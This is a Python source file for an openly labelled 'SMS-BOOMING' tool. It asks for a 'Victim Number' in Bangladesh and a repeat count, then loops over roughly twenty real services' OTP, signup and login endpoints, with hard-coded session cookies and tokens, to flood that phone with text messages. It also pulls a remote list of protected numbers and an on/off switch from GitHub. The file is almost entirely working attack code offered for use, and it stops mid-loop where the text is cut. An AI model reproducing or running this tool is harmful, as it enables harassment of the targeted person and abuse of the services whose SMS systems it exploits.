from logo import *
import os,sys,time,requests,random,string
import random,string
from requests.structures import CaseInsensitiveDict


protect = requests.get("https://raw.githubusercontent.com/EthicalUniverse/BOMB-X/refs/heads/main/protect_number.txt").text


pwd = 'hgue73jdjs'
    		
def sty2(sty2):
	for x in sty2+"\n":
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.003)
				
def sty4(sty4):
	for x in sty4+"\n":
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.03)
		
		
def line():
	sty2(55*'\033[1;31m_')
	
	
def clear():
	os.system('clear')
	logo.logo1()
	line()
	
	
def exit():
	sty4('\033[1;31m\tNUR\033[1;33m  âž¤  \033[1;37m Thank you for using ðŸ’–ðŸ’– !!')
	os.system('exit')
	
def status():
	bbb = 'false' 
	active = requests.get("https://raw.githubusercontent.com/EthicalUniverse/BOMB-X/refs/heads/main/status.txt").text
	if bbb in (active): 
		os.system('clear')
		logo.logox()
		print(55*'\033[1;31m_')
		print(' ')
		print("\033[1;33m[\033[1;31m??\033[1;33m]  \033[1;37mCREATOR      \033[1;31m:  \033[1;32mASSADUZZMAN NUR")
		print("\033[1;33m[\033[1;31m01\033[1;33m]  \033[1;37mGITHUB      \033[1;31m:  \033[1;32mNUR-YT-TERMUX")
		print("\033[1;33m[\033[1;31m02\033[1;33m]  \033[1;37mFACEBOOK    \033[1;31m:  \033[1;32mNOBITA YT")
		print("\033[1;33m[\033[1;31m03\033[1;33m]  \033[1;37mTOOL       \033[1;31m:  \033[1;32mSMS-BOOMING  \033[1;31m(Templore Off)")
		print("\033[1;33m[\033[1;31m00\033[1;33m]  \033[1;37mExit ")
		print(55*'\033[1;31m_')
		print(' ')
		opta = input("\033[1;36m<\033[1;37m/\033[1;36m>  \033[1;32mSelect Option\033[1;33m     âž¤    \033[1;37m")
		
		if opta in ['1','01']:
			os.system("xdg-open https://github.com/NUR-YT-TERMUX")
			time.sleep(2)
			status()
			
		elif opta in ['2','02']:
			os.system("xdg-open https://t.me/nuryt100")
			time.sleep(2)
			status()
			
		elif opta in ['3','03']:
			print(f"\033[1;31mService Temperature Off")
			time.sleep(2)
			status()
			
		elif opta in ['0','00']:
			time.sleep(2)
			exit()
		else:
			print(f"\033[1;31mSelect    Valut    Option.......")
			time.sleep(2)
			status()
		
	else:
		menu()
	
	
def menu():
	clear()
	print(' ')
	menux.menu1()
	print("\033[1;33m[\033[1;31m00\033[1;33m]  \033[1;37mExit ")
	line()
	print(' ')
	darkx=input("\033[1;36m<\033[1;37m/\033[1;36m>  \033[1;32mSelect Option\033[1;33m     âž¤    \033[1;37m")
	
	if darkx in ['1','01']:
		os.system("xdg-open https://github.com/NUR-YT-TERMUX")
		time.sleep(2)
		menu()
	elif darkx in ['2','02']:
		os.system("xdg-open https://t.me/nuryt100")
		time.sleep(2)
		menu()
	elif darkx in ['3','03']:
		time.sleep(2)
		_darkx_()
	elif darkx in ['0','00']:
		time.sleep(2)
		exit()
	else:
		print(f"\033[1;31mSelect    Valut    Option.......")
		time.sleep(2)
		menu()
	
	
def _darkx_():
	os.system('clear')
	logo.logox()
	line()
	print(' ')
	menux.menu2()
	line()
	print(' ')
	number = input("\033[1;36m<\033[1;37m/\033[1;36m>  \033[1;32mVictim Number\033[1;33m  âž¤ \033[1;37m+880")
	if not number.isdigit() or len(number) !=10:
		print(f"\033[1;31m Please Enter Valut number .......")
		time.sleep(2)
		_darkx_()
	if number in (protect):
		print(' ')
		sty4('\033[1;36m   <\033[1;37m/\033[1;36m>\033[1;31m Sorry   \033[1;33mâž¤    \033[1;32mThis Number is Protected !!')
		time.sleep(2)
		_darkx_()
	print(' ')
	sty4('\033[1;31m\tNote\033[1;33m  âž¤  \033[1;37m1 ENJOY THIS TOOL !!')
	print(' ')
	amo=int(input("\033[1;36m<\033[1;37m/\033[1;36m>  \033[1;32mAMOUNT  \033[1;33m  âž¤ \033[1;37m "))
	codebd='+880'
	line()
	print(' ')
	urls=int(20)
	total=urls*amo
	print(" \t\033[1;36m\t<\033[1;37m/\033[1;36m>  \033[1;31mTotal Process \033[1;33m  âž¤  \033[1;36m",total)
	print(' ')
	sty4("\t\033[1;36m\t<\033[1;37m/\033[1;36m>   \033[1;36mStart with NUR-YT-TERMUX\033[1;36m<\033[1;37m/\033[1;36m> ")
	print(' ')
	input('\t\t\033[1;31mCLICK ENTER AND START YOUR BOOMING.......')
	print(' ')
	
	url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+number
	
	url2 = "https://www.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"
	headers2 = CaseInsensitiveDict()
	headers2["referer"] = "https://www.bioscopelive.com/en/login?type=login"
	
	url3 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
	headers3 = CaseInsensitiveDict()
	headers3["Content-Type"] = "application/json"
	data3 = '{"msisdn":"'+number+'"}'
	
	url4 = "https://fundesh.com.bd/api/auth/resendOTP"
	headers4 = CaseInsensitiveDict()
	headers4["Content-Type"] = "application/json"
	data4 = '{"msisdn":"'+number+'"}'
	
	url5 = "https://api.redx.com.bd/v1/user/signup"
	headers5 = CaseInsensitiveDict()
	headers5["Accept"] = "application/json, text/plain, */*"
	headers5["Accept-Encoding"] = "gzip, deflate, br"
	headers5["Accept-Language"] = "en-US,en;q=0.5"
	headers5["Connection"] = "keep-alive"
	headers5["Content-Length"] = "65"
	headers5["Content-Type"] = "application/json"
	headers5["Cookie"] = "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1"
	headers5["Host"] = "api.redx.com.bd"
	headers5["Origin"] = "https://redx.com.bd"
	headers5["Referer"] = "https://redx.com.bd/registration/"
	headers5["TE"] = "Trailers"
	headers5["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
	headers5["x-access-token"] = "Bearer null"
	data5= '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
	
	url6 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
	headers6 = CaseInsensitiveDict()
	headers6["Content-Type"] = "application/json"
	data6 = '{"operator":"all","msisdn":"880'+number+'"}'
	
	
	url7 ="https://www.rokomari.com/resend-verification-code?email_phone=880"+number

	
	url8 = "https://www.pizzahutbd.com/customer/sign-in/mobile"
	headers8 = CaseInsensitiveDict()
	headers8["Cookie"] = "XSRF-TOKEN=eyJpdiI6InNuQmtkMnFVT2xzT0I3eWhqbW5neHc9PSIsInZhbHVlIjoib3NEdnYrZUpuQWpoZ0dEcnJNT2VxVHd2M21acHFxWURzWXdYdlQrZVN2YTZlTGxWUktjUlllZEpxS0xpdG9odSIsIm1hYyI6IjM3N2ZmMjkyM2I4NmE2N2E5MjBmMzAzNThmMGQ0MTU0M2M0MmFlYTZiODkzYTc0MGY0M2JhZGNiNGMyMmNkNmYifQ%3D%3D; laravel_session=eyJpdiI6Ik13OW9FMzkraEprMlRVY0d1Z0dcL2hRPT0iLCJ2YWx1ZSI6InBzcVVOdnpVOEFoMllrdVJMeDhJdndvSGtOYWlJd3lzbzdFSVY4OXNOZWpDdFIrWVU0UzNwcWVEcHlcL1NscXZMIiwibWFjIjoiMWZiMDBkNDc3ZDJjNDYzYTU1NjAxOWRmZDBmZTFlNjVhNDlkOTljMjM5YmYxZmUxY2NhMDE5YjBmZjdkODU1MiJ9; _fbp=fb.1.95760618126.170097696; _ga_Y46ECXC3WS=GS1.1.957606120.1.1.957606120.0; _ga=GA1.2.157655917.957606120; _gid=GA1.2.1912717920.957606120; _gat_gtag_UA_80641075_1=1"
	headers8["Content-Type"] = "application/x-www-form-urlencoded"
	data8 = "_token=t7I6C5hDF7XgnfD5rNkeEloIbGlS71lpa6tHZMPh&phone_number=0"+number
	
	url9 = "https://admission.ndub.edu.bd/api/users/register-step-1/"
	headers9 = CaseInsensitiveDict()
	headers9["Content-Type"] = "application/json"
	data9 = '{"name":"asad","email":"'+pwd+'@gmail.com","phone":"0'+number+'","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}'
	
	url10 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
	headers10 = CaseInsensitiveDict()
	headers10["Content-Type"] = "application/json"
	data10 = '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}'
	
	url11 = "https://api.shikho.com/auth/v2/send/sms"
	headers11 = CaseInsensitiveDict()
	headers11["Content-Type"] = "application/json"
	data11 = '{"phone":"0'+number+'","email":null,"auth_type":"login"}'
	
	url12 = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
	data12 = {'requestType':'send',    'phoneNumber':'+880'+number,    'emailConsent':'true',    'whatsappConsent':'true'}
	
	url13 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
	headers13 = CaseInsensitiveDict()
	headers13["Content-Type"] = "application/json"
	
	data13 = """
	{
	 "AccessToken": "",
	"TrackingNo": "",
	"mobileNo": "0"""""+number+"""",
	"otpSms": "",
	"product_id": "201",
	"requestChannel": "MOB",
	"trackingStatus": 5
	}
	"""
	url14 = "https://cms.beta.praavahealth.com/api/v2/user/login/?mobile="
	headers14 = CaseInsensitiveDict()
	headers14["X-Requested-With"] = "XMLHttpRequest"
	headers14["Content-Type"] = "application/x-www-form-urlencoded"
	data14 = "mobile=0"+number+"&is_login=true&forgetpass=false"
	
	url15 = "https://themallbd.com/api/auth/otp_login"
	headers15 = CaseInsensitiveDict()
	headers15["Content-Type"] = "application/json"
	data15 = '{"phone_number":"+880'+number+'"}'
	
	url16 = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"
	headers16 = CaseInsensitiveDict()
	headers16["Host"] = "api.ghoorilearning.com"
	headers16["Origin"] = "https://ghoorilearning.com"
	headers16["Referer"] = "https://ghoorilearning.com/"
	headers16["Content-Type"] = "application/json"
	data16 = '{"name":"asad","mobile_no":"0'+number+'","password":"WzfTW4Cecz7NjAm","confirm_password":"WzfTW4Cecz7NjAm"}'
	
	url17 = "https://api.wholesalecart.com/v2/user/login-register"
	headers17 = CaseInsensitiveDict()
	headers17["Accept-Encoding"] = "gzip, deflate, br"
	headers17["Accept-Language"] = "en-US,en;q=0.5"
	headers17["Connection"] = "keep-alive"
	headers17["Content-Length"] = "75"
	headers17["Content-Type"] = "application/json"
	headers17["Host"] = "api.wholesalecart.com"
	headers17["Origin"] = "https://wholesalecart.com"
	headers17["Referer"] = "https://wholesalecart.com/login"
	headers17["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
	data17 = '{"phone":"0'+number+'","platform":"google","url":"https://www.google.com/"}'
	
	url18 = "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp"
	headers18 = CaseInsensitiveDict()
	headers18["Content-Type"] = "application/json"
	data18 = '{"phone":"0'+number+'"}'
	
	url19 = "https://app.ipay.com.bd/api/v1/signup/v2"
	headers19 = CaseInsensitiveDict()
	headers19["Content-Type"] = "application/json"
	data19 = '{"accountType":1,"deviceId":"mobile-android-SM-N971N-a23e77d4428c3d91","mobileNumber":"+880'+number+'"}'
	
	url20 = "https://admission.ndub.edu.bd/api/users/reset/"
	headers20 = CaseInsensitiveDict()
	headers20["Content-Type"] = "application/json"
	data20 = '{"phone": "0'+number+'"}'
	
	url21 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+number
	
	url22 = "https://www.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"
	headers22 = CaseInsensitiveDict()
	headers22["referer"] = "https://www.bioscopelive.com/en/login?type=login"
	
	url23 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
	headers23 = CaseInsensitiveDict()
	headers23["Content-Type"] = "application/json"
	data23 = '{"msisdn":"'+number+'"}'
	
	url24 = "https://fundesh.com.bd/api/auth/resendOTP"
	headers24 = CaseInsensitiveDict()
	headers24["Content-Type"] = "application/json"
	data24 = '{"msisdn":"'+number+'"}'
	
	url25 = "https://api.redx.com.bd/v1/user/signup"
	headers25 = CaseInsensitiveDict()
	headers25["Accept"] = "application/json, text/plain, */*"
	headers25["Accept-Encoding"] = "gzip, deflate, br"
	headers25["Accept-Language"] = "en-US,en;q=0.5"
	headers25["Connection"] = "keep-alive"
	headers25["Content-Length"] = "65"
	headers25["Content-Type"] = "application/json"
	headers25["Cookie"] = "_ga=GA1.3.1117093475.951445077; _gid=GA1.3.134905361.951445077; WZRK_S_4R6-9R6-155Z=%7B%22p%22%3A1%2C%22s%22%3A951410497%2C%22t%22%3A951445096%7D; WZRK_G=6184e322525e444ab0f771f7f041933a; _fbp=fb.2.951445106167.1213159921; _hjSessionUser_2064965=eyJpZCI6ImRhMmMzMDY1LWNkMDYtNWFlOC04NTA4LTg0MzYzYWM4Y2RiNyIsImNyZWF0ZWQiOjE2NTE0NDUxMDkwMjMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMxMGI0MDQ2LTY3OGUtNDM2OS1hOWY1LTRlYzlmOWEyMDhkNCIsImNyZWF0ZWQiOjE2NTE0NDUxMTg1NzgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1"
	headers25["Host"] = "api.redx.com.bd"
	headers25["Origin"] = "https://redx.com.bd"
	headers25["Referer"] = "https://redx.com.bd/registration/"
	headers25["TE"] = "Trailers"
	headers25["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
	headers25["x-access-token"] = "Bearer null"
	data25= '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
	
	url26 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
	headers26 = CaseInsensitiveDict()
	headers26["Content-Type"] = "application/json"
	data26 = '{"operator":"all","msisdn":"880'+number+'"}'
	
	
	url27 ="https://www.rokomari.com/resend-verification-code?email_phone=880"+number

	
	url28 = "https://www.pizzahutbd.com/customer/sign-in/mobile"
	headers28 = CaseInsensitiveDict()
	headers28["Cookie"] = "XSRF-TOKEN=eyJpdiI6InNuQmtkMnFVT2xzT0I3eWhqbW5neHc9PSIsInZhbHVlIjoib3NEdnYrZUpuQWpoZ0dEcnJNT2VxVHd2M21acHFxWURzWXdYdlQrZVN2YTZlTGxWUktjUlllZEpxS0xpdG9odSIsIm1hYyI6IjM3N2ZmMjkyM2I4NmE2N2E5MjBmMzAzNThmMGQ0MTU0M2M0MmFlYTZiODkzYTc0MGY0M2JhZGNiNGMyMmNkNmYifQ%3D%3D; laravel_session=eyJpdiI6Ik13OW9FMzkraEprMlRVY0d1Z0dcL2hRPT0iLCJ2YWx1ZSI6InBzcVVOdnpVOEFoMllrdVJMeDhJdndvSGtOYWlJd3lzbzdFSVY4OXNOZWpDdFIrWVU0UzNwcWVEcHlcL1NscXZMIiwibWFjIjoiMWZiMDBkNDc3ZDJjNDYzYTU1NjAxOWRmZDBmZTFlNjVhNDlkOTljMjM5YmYxZmUxY2NhMDE5YjBmZjdkODU1MiJ9; _fbp=fb.1.95760618126.170097696; _ga_Y46ECXC3WS=GS1.1.957606120.1.1.957606120.0; _ga=GA1.2.157655917.957606120; _gid=GA1.2.1912717920.957606120; _gat_gtag_UA_80641075_1=1"
	headers28["Content-Type"] = "application/x-www-form-urlencoded"
	data28 = "_token=t7I6C5hDF7XgnfD5rNkeEloIbGlS71lpa6tHZMPh&phone_number=0"+number
	
	url29 = "https://admission.ndub.edu.bd/api/users/register-step-1/"
	headers29 = CaseInsensitiveDict()
	headers29["Content-Type"] = "application/json"
	data29 = '{"name":"asad","email":"'+pwd+'@gmail.com","phone":"0'+number+'","password":"1q2w3e4r","confirmPassword":"1q2w3e4r"}'
	
	url30 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
	headers30 = CaseInsensitiveDict()
	headers30["Content-Type"] = "application/json"
	data30 = '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}'
	
	url31 = "https://api.shikho.com/auth/v2/send/sms"
	headers31 = CaseInsensitiveDict()
	headers31["Content-Type"] = "application/json"
	data31 = '{"phone":"0'+number+'","email":null,"auth_type":"login"}'
	
	url32 = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
	data32 = {'requestType':'send',    'phoneNumber':'+880'+number,    'emailConsent':'true',    'whatsappConsent':'true'}
	
	url33 = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
	headers33 = CaseInsensitiveDict()
	headers33["Content-Type"] = "application/json"
	
	data33 = """
	{
	 "AccessToken": "",
	"TrackingNo": "",
	"mobileNo": "0"""""+number+"""",
	"otpSms": "",
	"product_id": "201",
	"requestChannel": "MOB",
	"trackingStatus": 5
	}
	"""
	url34 = "https://cms.beta.praavahealth.com/api/v2/user/login/?mobile="
	headers34 = CaseInsensitiveDict()
	headers34["X-Requested-With"] = "XMLHttpRequest"
	headers34["Content-Type"] = "application/x-www-form-urlencoded"
	data34 = "mobile=0"+number+"&is_login=true&forgetpass=false"
	
	url35 = "https://themallbd.com/api/auth/otp_login"
	headers35 = CaseInsensitiveDict()
	headers35["Content-Type"] = "application/json"
	data35 = '{"phone_number":"+880'+number+'"}'
	
	url36 = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"
	headers36 = CaseInsensitiveDict()
	headers36["Host"] = "api.ghoorilearning.com"
	headers36["Origin"] = "https://ghoorilearning.com"
	headers36["Referer"] = "https://ghoorilearning.com/"
	headers36["Content-Type"] = "application/json"
	data36 = '{"name":"asad","mobile_no":"0'+number+'","password":"WzfTW4Cecz7NjAm","confirm_password":"WzfTW4Cecz7NjAm"}'
	
	url37 = "https://api.wholesalecart.com/v2/user/login-register"
	headers37 = CaseInsensitiveDict()
	headers37["Accept-Encoding"] = "gzip, deflate, br"
	headers37["Accept-Language"] = "en-US,en;q=0.5"
	headers37["Connection"] = "keep-alive"
	headers37["Content-Length"] = "75"
	headers37["Content-Type"] = "application/json"
	headers37["Host"] = "api.wholesalecart.com"
	headers37["Origin"] = "https://wholesalecart.com"
	headers37["Referer"] = "https://wholesalecart.com/login"
	headers37["User-Agent"] = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
	data37 = '{"phone":"0'+number+'","platform":"google","url":"https://www.google.com/"}'
	
	url38 = "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp"
	headers38 = CaseInsensitiveDict()
	headers38["Content-Type"] = "application/json"
	data38 = '{"phone":"0'+number+'"}'
	
	url39 = "https://app.ipay.com.bd/api/v1/signup/v2"
	headers39 = CaseInsensitiveDict()
	headers39["Content-Type"] = "application/json"
	data39 = '{"accountType":1,"deviceId":"mobile-android-SM-N971N-a23e77d4428c3d91","mobileNumber":"+880'+number+'"}'
	
	url40 = "https://admission.ndub.edu.bd/api/users/reset/"
	headers40 = CaseInsensitiveDict()
	headers40["Content-Type"] = "application/json"
	data40 = '{"phone": "0'+number+'"}'

	for i in range(amo):
		tim=time.strftime('  %I:%M ')
		try:
			tim=time.strftime('  %I:%M ')
			resp1 = requests.get(url1)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp2 = requests.get(url2,headers=headers2)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp3 = requests.post(url3, headers=headers3, data=data3)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			resp4 = requests.post(url4, headers=headers4, data=data4)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp5 = requests.post(url5, headers=headers5, data=data5)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp6 = requests.post(url6, headers=headers6, data=data6)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp7 = requests.get(url7)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp10 = requests.get(url8,headers=headers8, data=data8)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
			
		try:
			tim=time.strftime('  %I:%M ')
			resp11 = requests.get(url9,headers=headers9, data=data9)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp12 = requests.post(url10,headers=headers10, data=data10)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp13 = requests.get(url11,headers=headers11, data=data11)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp14 = requests.post(url12,data=data12)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp8 = requests.post(url13,headers=headers13, data=data13)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			requests.get(url14+number)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp9 = requests.post(url15, headers=headers15, data=data15)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp19 = requests.post(url16, headers=headers16, data=data16)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp20 = requests.post(url17,data17)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSEND FAILED \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		
		try:
			tim=time.strftime('  %I:%M ')
			resp21 = requests.post(url18, headers=headers18, data=data18)
			print('\033[1;36m<\033[1;37m/\033[1;36m> \033[1;31mSUCCESSFUL \033[1;33mâž¤ \033[1;37m[',codebd,number,']  \033[1;33mâž¤ \033[1;36mNUR\033[1;37m'+tim)
		except OSError:
			tim=time.strftime('  %I:%M ')
